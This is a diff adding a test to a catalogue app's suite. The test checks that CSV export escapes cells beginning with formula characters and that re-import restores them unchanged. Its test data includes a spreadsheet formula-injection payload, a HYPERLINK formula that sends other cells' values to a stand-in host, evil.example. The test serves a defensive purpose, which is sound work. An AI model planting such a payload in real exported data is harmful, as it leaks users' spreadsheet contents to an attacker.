@@ -135,6 +135,31 @@ describe('a Nalanda export, imported again', () => {
     }
   });
 
+  it('carries a title that reads as a formula, and a note that starts with a quote, out and back unchanged (§16 #91)', async () => {
+    const admin = await createUser(env.DB, { username: 'admin', passwordHash: 'pbkdf2$1$x$y', role: 'admin', mustChangePassword: false });
+    const cookie = `${SESSION_COOKIE}=${await createSessionToken(env.SESSION_SECRET, admin, Math.floor(Date.now() / 1000))}`;
+    const shelf = await createLibrary(env.DB, 'Shelf');
+    const formula = '=HYPERLINK("https://evil.example/?"&D2&E2,"Open")';
+    await createItem(env.DB, { libraryId: shelf.id, mediaType: 'book', title: formula, creators: '+1 Forever', notes: "'quoted", location: '-', details: '{}' });
+    await createItem(env.DB, { libraryId: shelf.id, mediaType: 'book', title: '=1+1', details: '{}' });
+
+    const csv = (await call('/export.csv?after=0', cookie)).text;
+    // a spreadsheet reads a cell starting with ' as text and shows the rest: no cell leaves as a formula
+    expect(csv).toContain(`"'=HYPERLINK(""https://evil.example/?""&D2&E2,""Open"")"`);
+    expect(csv).toMatch(/(^|,)'=1\+1(,|\r\n)/m);
+    expect(csv).toContain(",'+1 Forever,");
+    expect(csv).toContain(",''quoted,'-,");
+    for (const line of csv.split('\r\n').slice(1).filter(Boolean)) for (const cell of parseCsv(csv.split('\r\n')[0] + '\r\n' + line)) for (const v of Object.values(cell)) expect(v).not.toMatch(/^[=+\-@\t\r]/);
+
+    const target = await createLibrary(env.DB, 'Restored');
+    expect(JSON.parse((await call('/api/import', cookie, { libraryId: target.id, rows: parseCsv(csv) })).text)).toMatchObject({ inserted: 2, skipped: 0 });
+    const back = (await env.DB.prepare('SELECT title, creators, notes, location FROM items WHERE library_id = ?1 ORDER BY id').bind(target.id).all<Record<string, string | null>>()).results;
+    expect(back).toEqual([
+      { title: formula, creators: '+1 Forever', notes: "'quoted", location: '-' },
+      { title: '=1+1', creators: null, notes: null, location: null },
+    ]);
+  });
+
   it('brings a board game’s BGG facts back — its weight among them — so it fits tonight’s filters as before (§16 #60)', async () => {
     const admin = await createUser(env.DB, { username: 'admin', passwordHash: 'pbkdf2$1$x$y', role: 'admin', mustChangePassword: false });
     const cookie = `${SESSION_COOKIE}=${await createSessionToken(env.SESSION_SECRET, admin, Math.floor(Date.now() / 1000))}`;
